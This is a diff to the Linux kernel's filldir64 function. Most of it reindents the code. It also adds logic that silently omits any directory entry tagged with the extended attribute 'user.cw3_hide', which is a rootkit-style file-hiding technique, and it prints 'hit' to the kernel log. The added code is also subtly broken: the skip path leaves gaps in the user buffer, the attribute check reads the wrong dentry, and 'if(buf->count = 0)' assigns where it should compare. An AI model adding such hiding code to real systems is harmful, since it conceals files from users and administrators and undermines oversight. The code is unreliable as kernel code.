@@ -311,72 +311,77 @@ struct getdents_callback64 {
 };
 
 static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
-		     loff_t offset, u64 ino, unsigned int d_type)
+                      loff_t offset, u64 ino, unsigned int d_type)
 {
-	struct file *file = NULL;
-	struct linux_dirent64 __user *dirent, *prev;
-	struct getdents_callback64 *buf =
-		container_of(ctx, struct getdents_callback64, ctx);
-	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
-		sizeof(u64));
-	int prev_reclen;
-	if (buf && buf->file){
+    struct file *file = NULL;
+    struct linux_dirent64 __user *dirent, *prev;
+    struct getdents_callback64 *buf =
+        container_of(ctx, struct getdents_callback64, ctx);
+    int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
+                      sizeof(u64));
+    int prev_reclen;
+    if (buf && buf->file) {
         file = buf->file;
-	}
-	buf->error = verify_dirent_name(name, namlen);
-	if (unlikely(buf->error))
-		return false;
-	buf->error = -EINVAL;	/* only used if we fail.. */
-	if (reclen > buf->count)
-		return false;
-	prev_reclen = buf->prev_reclen;
-	if (prev_reclen && signal_pending(current))
-		return false;
-	dirent = buf->current_dir;
-	prev = (void __user *)dirent - prev_reclen;
-	if (!user_write_access_begin(prev, reclen + prev_reclen))
-		goto efault;
+    }
+    buf->error = verify_dirent_name(name, namlen);
+    if (unlikely(buf->error))
+        return false;
+    buf->error = -EINVAL;   /* only used if we fail.. */
+    if (reclen > buf->count)
+        return false;
+    prev_reclen = buf->prev_reclen;
+    if (prev_reclen && signal_pending(current))
+        return false;
+    dirent = buf->current_dir;
+    prev = (void __user *)dirent - prev_reclen;
+    if (!user_write_access_begin(prev, reclen + prev_reclen))
+        goto efault;
 
+    if (file && file->f_path.dentry) {
+        struct dentry *dentry = file->f_path.dentry;
+        char xattr_value[256]; // Adjust the size as needed
 
-	if (file && file->f_path.dentry) {
-			struct dentry *dentry = file->f_path.dentry;
-			char xattr_value[256]; // Adjust the size as needed
+        ssize_t len = vfs_getxattr(&init_user_ns, dentry, "user.cw3_hide", xattr_value, sizeof(xattr_value));
 
-			ssize_t len = vfs_getxattr(&init_user_ns, dentry, "user.cw3_hide", xattr_value, sizeof(xattr_value));
+        if (len >= 0) {
+            // xattr exists, skip listing this directory entry
+            // Check for different types depending on type
+            printk("hit");
+            user_write_access_end();
+            goto skip_entry;
+        }
+    }
 
-			if (len >= 0) {
-				// xattr exists, skip listing this directory entry
-				//Check for differnt types depending on type
-				printk("hit");
-				user_write_access_end();
-            	goto skip_entry;
-			}
-	}
+    /* This might be 'dirent->d_off', but if so it will get overwritten */
+    unsafe_put_user(offset, &prev->d_off, efault_end);
+    unsafe_put_user(ino, &dirent->d_ino, efault_end);
+    unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
+    unsafe_put_user(d_type, &dirent->d_type, efault_end);
+    unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
+    user_write_access_end();
 
+    buf->prev_reclen = reclen;
+    buf->current_dir = (void __user *)dirent + reclen;
+    buf->count -= reclen;
 
-	/* This might be 'dirent->d_off', but if so it will get overwritten */
-	unsafe_put_user(offset, &prev->d_off, efault_end);
-	unsafe_put_user(ino, &dirent->d_ino, efault_end);
-	unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
-	unsafe_put_user(d_type, &dirent->d_type, efault_end);
-	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
-	user_write_access_end();
-
-	buf->prev_reclen = reclen;
-	buf->current_dir = (void __user *)dirent + reclen;
-	buf->count -= reclen;
-	return true;
+    return true;
 
 efault_end:
-	user_write_access_end();
+    user_write_access_end();
 efault:
-	buf->error = -EFAULT;
-	return false;
+    buf->error = -EFAULT;
+    return false;
+
 skip_entry:
     // If skipping an entry, update buffer state without writing to the buffer
     buf->prev_reclen = reclen;
     buf->current_dir = (void __user *)dirent + reclen;
     buf->count -= reclen;
+
+	if(buf->count = 0 ){
+		return false;
+	}
+	
     return true;
 }
 
